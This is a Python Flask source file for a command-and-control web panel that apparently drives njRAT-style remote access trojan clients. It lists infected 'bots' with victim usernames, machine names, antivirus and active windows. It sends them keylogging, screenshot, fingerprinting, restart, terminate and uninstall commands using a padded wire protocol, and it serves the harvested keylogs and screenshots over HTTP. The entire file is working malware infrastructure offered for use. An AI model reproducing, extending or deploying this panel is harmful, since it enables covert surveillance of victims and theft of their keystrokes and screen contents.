from flask import Flask, render_template, jsonify, request, send_from_directory
import threading
import asyncio
import os
from pathlib import Path
from server import RATServer
from server import Bot
from datetime import datetime

app = Flask(__name__)
rat_server = RATServer()
PADDING = "Y262SUCZ4UJJ"

# Ensure directories exist
Path("screenshots").mkdir(exist_ok=True)
Path("keylogs").mkdir(exist_ok=True)

def run_socket_server():
    asyncio.run(rat_server.start())

# Start socket server in background thread
threading.Thread(target=run_socket_server, daemon=True).start()

@app.route('/')
def index():
    return render_template('index.html')
    
@app.route('/api/bots')
def get_bots():
    bots_list = []
    for bot_id, bot in rat_server.bots.items():
        if bot.connected:
            bots_list.append({
                'id': bot_id,
                'pc_name': bot.pc_name,
                'username': bot.username,
                'os': bot.os,
                'last_seen': bot.last_seen.strftime("%H:%M:%S"),
                'addr': bot.addr[0] if bot.addr else "Unknown"
            })
    return jsonify(bots_list)

@app.route('/api/bot/<bot_id>')
def get_bot_details(bot_id):
    bot = rat_server.bots.get(bot_id)
    if not bot or not bot.connected:
        return jsonify({'status': 'error', 'message': 'Bot not found'})

    return jsonify({
        'id': bot.id,
        'pc_name': bot.pc_name,
        'bot_name': bot.bot_name,
        'username': bot.username,
        'os': bot.os,
        'webcam': bot.webcam,
        'install_date': bot.install_date,
        'volume_id': bot.volume_id,
        'AV': bot.AV,
        'active_window': bot.active_window,
        'addr': str(bot.addr[0]) if bot.addr else 'Unknown',
        'last_seen': bot.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
        'config_info': bot.config_info,
        'full_fingerprint': bot.full_fingerprint
    })

@app.route('/api/bot/<bot_id>/refresh')
def refresh_bot(bot_id):
    bot = rat_server.bots.get(bot_id)
    if not bot or not bot.connected:
        return jsonify({'status': 'error', 'message': 'Bot not found'})
    # print(bytearray(bot.active_window))
    return jsonify({
        'active_window': bot.active_window,
        'last_seen': bot.last_seen.strftime("%H:%M:%S")
    })

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    bot_id = data.get('bot_id')
    command = data.get('command')

    bot:Bot = rat_server.bots.get(bot_id)
    if not bot or not bot.connected:
        return jsonify({'status': 'error', 'message': 'Bot not found or disconnected'})

    try:
        if not hasattr(rat_server, 'loop') or rat_server.loop is None:
            return jsonify({'status': 'error', 'message': 'Server not ready'})

        if command == 'fingerprint':
            coro = bot.send("ll" + PADDING)
        elif command == 'keylog':
            coro = bot.send("kl" + PADDING)
        elif command == 'screenshot':
            coro = bot.send("CAP" + PADDING + "800" + PADDING + "600")
        elif command == 'uninstall':
            coro = bot.send("un" + PADDING + "~") 
        elif command == 'terminate':
            coro = bot.send("un" + PADDING + "!")
        elif command == 'restart':
            coro = bot.send("un" + PADDING + "@")
        else:
            return jsonify({'status': 'error', 'message': 'Unknown command'})

        future = asyncio.run_coroutine_threadsafe(coro, rat_server.loop)
        future.result(timeout=5)

        return jsonify({'status': 'success', 'message': f'Command {command} sent'})

    except Exception as e:
        print(f"[-] Failed to send command: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# ============== Screenshots ==============
@app.route('/api/screenshots')
def get_screenshots():
    files = sorted([f for f in os.listdir('screenshots') if f.endswith(('.jpg', '.jpeg', '.png'))], reverse=True)
    return jsonify(files)

@app.route('/screenshots/<filename>')
def serve_screenshot(filename):
    return send_from_directory('screenshots', filename)

# ============== Keylogs ==============
@app.route('/api/keylogs')
def get_keylogs():
    files = sorted([f for f in os.listdir('keylogs') if f.endswith('.log')], reverse=True)
    return jsonify(files)

@app.route('/keylogs/<filename>')
def serve_keylog(filename):
    return send_from_directory('keylogs', filename)

if __name__ == '__main__':
    print("[*] Starting njRAT C2 - Flask + Socket Server")
    print("[*] Web UI: http://127.0.0.1:8080")
    app.run(host='0.0.0.0', port=8080, debug=False)